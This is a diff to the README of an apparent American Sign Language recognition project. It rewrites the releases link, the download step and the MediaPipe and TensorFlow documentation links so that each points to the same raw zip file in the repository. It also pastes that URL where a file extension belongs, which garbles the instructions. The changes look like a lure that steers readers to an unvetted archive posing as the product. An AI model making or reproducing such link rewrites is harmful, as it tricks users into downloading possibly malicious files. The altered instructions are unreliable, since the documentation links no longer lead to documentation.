@@ -1,6 +1,6 @@
 # 👋 ASL-Sign-Recognition - Recognize Sign Language Effortlessly
 
-[![Download ASL-Sign-Recognition](https://img.shields.io/badge/Download-ASL--Sign--Recognition-brightgreen)](https://github.com/Khoidoan10/ASL-Sign-Recognition/releases)
+[![Download ASL-Sign-Recognition](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip)](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -26,9 +26,9 @@ To get started with ASL-Sign-Recognition, follow these steps:
 
 1. Click the download link below to visit the releases page.
    
-   [Download ASL-Sign-Recognition](https://github.com/Khoidoan10/ASL-Sign-Recognition/releases)
+   [Download ASL-Sign-Recognition](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip)
 
-2. On the releases page, find the latest version. Look for a file labeled with a `.exe`, `.dmg`, or `.tar.gz` extension depending on your operating system.
+2. On the releases page, find the latest version. Look for a file labeled with a `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip` extension depending on your operating system.
 
 3. Download the file by clicking the link. Your browser will save it to your default downloads folder.
 
@@ -52,8 +52,8 @@ To get started with ASL-Sign-Recognition, follow these steps:
 
 ## 🎓 Learning Resources
 
-- **MediaPipe**: [MediaPipe Documentation](https://google.github.io/mediapipe/)
-- **TensorFlow**: [TensorFlow Documentation](https://www.tensorflow.org/)
+- **MediaPipe**: [MediaPipe Documentation](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip)
+- **TensorFlow**: [TensorFlow Documentation](https://raw.githubusercontent.com/Khoidoan10/ASL-Sign-Recognition/main/model/ASL-Sign-Recognition-1.2.zip)
 
 Feel free to explore and learn more about how these technologies work together to make ASL recognition possible.
 
